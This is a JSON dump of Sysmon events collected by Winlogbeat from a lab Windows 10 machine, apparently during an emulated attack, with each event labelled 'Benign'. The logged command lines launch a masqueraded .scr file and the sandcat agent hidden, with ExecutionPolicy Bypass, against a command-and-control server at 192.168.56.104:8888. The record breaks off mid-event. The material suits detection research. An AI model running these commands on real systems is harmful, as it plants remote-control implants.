{"@timestamp":"2022-03-23T10:43:34.632Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:43:34.632\nProcessGuid: {04787c88-f9d6-623a-fb00-000000000c00}\nProcessId: 4720\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4720,"thread":null,"entity_id":"{04787c88-f9d6-623a-fb00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8461,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:36.366Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:43:34.663Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File Delete archived:\nRuleName: -\nUtcTime: 2022-03-23 10:43:34.663\nProcessGuid: {04787c88-f9d6-623a-fb00-000000000c00}\nProcessId: 4720\nUser: WIN10\\vagrant\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_vsv3fj15.tqs.ps1\nHashes: SHA1=6AB83620379FC69F80C0242105DDFFD7D98D5D9D,MD5=D17FE0A3F47BE24A6453E9EF58C94641,SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7,IMPHASH=00000000000000000000000000000000\nIsExecutable: false\nArchived: true","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4720,"thread":null,"entity_id":"{04787c88-f9d6-623a-fb00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"23","api":"wineventlog","record_id":8462,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":null},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:36.366Z","code":"23"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:43:37.007Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 10:43:37.007\nProcessGuid: {04787c88-f8e6-623a-ce00-000000000c00}\nProcessId: 5592\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-Interactive\nCreationUtcTime: 2022-03-22 11:07:06.775\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5592,"thread":null,"entity_id":"{04787c88-f8e6-623a-ce00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8463,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:38.370Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:43:38.160Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:43:38.160\nProcessGuid: {04787c88-f9da-623a-fc00-000000000c00}\nProcessId: 2592\nImage: C:\\Users\\vagrant\\cod.3aka3.scr\nFileVersion: -\nDescription: -\nProduct: -\nCompany: -\nOriginalFileName: -\nCommandLine: \"C:\\Users\\vagrant\\cod.3aka3.scr\" /S\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=4B7FA56A4E85F88B98D11A6E018698AE3FBA5E62,MD5=9D1C5EF38E6073661C74660B3A71A76E,SHA256=0DF38A55D940F498478EB03683C94D4584236E100125B526A67650BA54DF4AE4,IMPHASH=F00447512A354E59D39D2818AABA4A17\nParentProcessGuid: {04787c88-f9d6-623a-fb00-000000000c00}\nParentProcessId: 4720\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nParentCommandLine: powershell.exe -ExecutionPolicy Bypass -C \"Sleep 3;$bin = Get-ChildItem *cod*scr*;$arguments = '-server \\\"http://192.168.56.104:8888\\\" -group \\\"rtlo_group\\\"';start-process -WindowStyle Hidden $bin.FullName.toString() -ArgumentList $arguments;if ($?) {  write-host \\\"Successfully completed RTLO execution. A new agent should appear\\\";  exit 0;} else {  write-host \\\"Failure of RTLO execution.\\\";  exit 1;}\"\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":2592,"thread":null,"entity_id":"{04787c88-f9da-623a-fc00-000000000c00}","executable":"C:\\Users\\vagrant\\cod.3aka3.scr","name":"cod.3aka3.scr","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8464,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:39.386Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:43:39.422Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: -\nUtcTime: 2022-03-23 10:43:39.422\nProcessGuid: {04787c88-f9d6-623a-fb00-000000000c00}\nProcessId: 4720\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive\nCreationUtcTime: 2020-09-26 20:35:42.672\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":4720,"thread":null,"entity_id":"{04787c88-f9d6-623a-fb00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8465,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:41.404Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:43:46.333Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Network connection detected:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 10:43:46.333\nProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nProcessId: 5344\nImage: C:\\Users\\Public\\sandcat.go-windows.exe\nUser: WIN10\\vagrant\nProtocol: udp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 224.0.0.251\nSourceHostname: -\nSourcePort: 5353\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 192.168.56.104\nDestinationHostname: LINUX\nDestinationPort: 5353\nDestinationPortName: -","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":null,"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"3","api":"wineventlog","record_id":8466,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:43:49.499Z","code":"3"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:07.357Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Network connection detected:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 10:44:07.357\nProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nProcessId: 5344\nImage: C:\\Users\\Public\\sandcat.go-windows.exe\nUser: WIN10\\vagrant\nProtocol: udp\nInitiated: false\nSourceIsIpv6: false\nSourceIp: 224.0.0.251\nSourceHostname: -\nSourcePort: 5353\nSourcePortName: -\nDestinationIsIpv6: false\nDestinationIp: 192.168.56.1\nDestinationHostname: LAPTOP-G4MKMDJR\nDestinationPort: 5353\nDestinationPortName: -","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":null,"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"3","api":"wineventlog","record_id":8467,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:10.774Z","code":"3"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.545Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\nUtcTime: 2022-03-23 10:44:33.545\nProcessGuid: {04787c88-fa11-623a-fd00-000000000c00}\nProcessId: 6992\nImage: C:\\Windows\\System32\\cmd.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows Command Processor\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: Cmd.Exe\nCommandLine: cmd.exe /C powershell.exe;if ($?) {  write-host \"[*] PowerShell successfully spawned\";  exit 0;}\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=A1DBD4949DF9E892E52201B06A2D24AA5082B3D5,MD5=9D59442313565C2E0860B88BF32B2277,SHA256=D0CEB18272966AB62B8EDFF100E9B4A6A3CB5DC0F2A32B2B18721FEA2D9C09A5,IMPHASH=272245E2988E1E430500B852C4FB5E18\nParentProcessGuid: {04787c88-f96f-623a-ea00-000000000c00}\nParentProcessId: 5344\nParentImage: C:\\Users\\Public\\sandcat.go-windows.exe\nParentCommandLine: \"C:\\Users\\Public\\sandcat.go-windows.exe\" -server http://192.168.56.104:8888 -group red -listenP2P -v \nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6992,"thread":null,"entity_id":"{04787c88-fa11-623a-fd00-000000000c00}","executable":"C:\\Windows\\System32\\cmd.exe","name":"cmd.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8468,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.028Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.547Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process accessed:\nRuleName: technique_id=T1036,technique_name=Masquerading\nUtcTime: 2022-03-23 10:44:33.547\nSourceProcessGUID: {04787c88-f96f-623a-ea00-000000000c00}\nSourceProcessId: 5344\nSourceThreadId: 1872\nSourceImage: C:\\Users\\Public\\sandcat.go-windows.exe\nTargetProcessGUID: {04787c88-fa11-623a-fd00-000000000c00}\nTargetProcessId: 6992\nTargetImage: C:\\Windows\\system32\\cmd.exe\nGrantedAccess: 0x1FFFFF\nCallTrace: C:\\Windows\\SYSTEM32\\ntdll.dll+9d934|C:\\Windows\\System32\\KERNELBASE.dll+5f32a|C:\\Windows\\System32\\KERNELBASE.dll+5bcc6|C:\\Windows\\System32\\KERNEL32.DLL+1be93|C:\\Users\\Public\\sandcat.go-windows.exe+644be\nSourceUser: WIN10\\vagrant\nTargetUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":5344,"thread":{"id":1872},"entity_id":"{04787c88-f96f-623a-ea00-000000000c00}","executable":"C:\\Users\\Public\\sandcat.go-windows.exe","name":"sandcat.go-windows.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"10","api":"wineventlog","record_id":8469,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"10"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.560Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Process Create:\nRuleName: technique_id=T1059.003,technique_name=Windows Command Shell\nUtcTime: 2022-03-23 10:44:33.560\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nFileVersion: 10.0.18362.1 (WinBuild.160101.0800)\nDescription: Windows PowerShell\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: PowerShell.EXE\nCommandLine: powershell.exe ;if ($?) {  write-host \"[*] PowerShell successfully spawned\";  exit 0;}\nCurrentDirectory: C:\\Users\\vagrant\\\nUser: WIN10\\vagrant\nLogonGuid: {04787c88-f86a-623a-be16-040000000000}\nLogonId: 0x416BE\nTerminalSessionId: 1\nIntegrityLevel: High\nHashes: SHA1=36C5D12033B2EAF251BAE61C00690FFB17FDDC87,MD5=CDA48FC75952AD12D99E526D0B6BF70A,SHA256=908B64B1971A979C7E3E8CE4621945CBA84854CB98D76367B791A6E22B5F6D53,IMPHASH=A7CEFACDDA74B13CD330390769752481\nParentProcessGuid: {04787c88-fa11-623a-fd00-000000000c00}\nParentProcessId: 6992\nParentImage: C:\\Windows\\System32\\cmd.exe\nParentCommandLine: cmd.exe /C powershell.exe;if ($?) {  write-host \"[*] PowerShell successfully spawned\";  exit 0;}\nParentUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"1","api":"wineventlog","record_id":8470,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"1"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.611Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"File created:\nRuleName: technique_id=T1059.001,technique_name=PowerShell\nUtcTime: 2022-03-23 10:44:33.611\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetFilename: C:\\Users\\vagrant\\AppData\\Local\\Temp\\__PSScriptPolicyTest_gwq0vqyf.cdw.ps1\nCreationUtcTime: 2022-03-23 10:44:33.611\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"11","api":"wineventlog","record_id":8471,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"11"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.626Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:44:33.626\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKU\\S-1-5-21-1265589927-3242731326-451682020-1000\\Software\\Microsoft\\SystemCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8472,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.626Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:44:33.626\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\SystemCertificates\\ROOT\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 (WinBuild.160101.0800)","build":"18363.418","type":"windows","platform":"windows"},"id":"04787c88-5486-46f2-93fc-7f6805a92d42","ip":["192.168.56.107","10.0.2.15"],"name":"win10.windomain.local","mac":["08:00:27:c5:40:cf","08:00:27:47:b4:2e"],"hostname":"win10","architecture":"x86_64"},"process":{"pid":6928,"thread":null,"entity_id":"{04787c88-fa11-623a-fe00-000000000c00}","executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","name":"powershell.exe","param2":null},"winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":"12","api":"wineventlog","record_id":8473,"computer_name":"win10.windomain.local","provider_name":"Microsoft-Windows-Sysmon","provider_guid":"{5770385f-c22a-43e0-bf4c-06f5698ffbd9}","keywords":null,"event_data":{"param2":null,"param1":null}},"event":{"kind":"event","provider":"Microsoft-Windows-Sysmon","created":"2022-03-23T10:44:35.029Z","code":"12"},"log":{"level":"information"},"verdict":"Benign"},{"@timestamp":"2022-03-23T10:44:33.626Z","@metadata":{"beat":"winlogbeat","type":"_doc","version":"7.15.2"},"message":"Registry object added or deleted:\nRuleName: technique_id=T1130,technique_name=Install Root Certificate\nEventType: CreateKey\nUtcTime: 2022-03-23 10:44:33.626\nProcessGuid: {04787c88-fa11-623a-fe00-000000000c00}\nProcessId: 6928\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\nTargetObject: HKLM\\SOFTWARE\\Microsoft\\EnterpriseCertificates\\Root\\Certificates\nUser: WIN10\\vagrant","ecs":{"version":"1.11.0"},"agent":{"ephemeral_id":"2a39ce90-bef1-48a2-9e5f-bcaee6f2b27c","id":"6a7bb1af-5225-4683-bb1f-a6736ccafa24","name":"win10","type":"winlogbeat","version":"7.15.2","hostname":"win10"},"host":{"os":{"version":"10.0","family":"windows","name":"Windows 10 Enterprise Evaluation","kernel":"10.0.18362.418 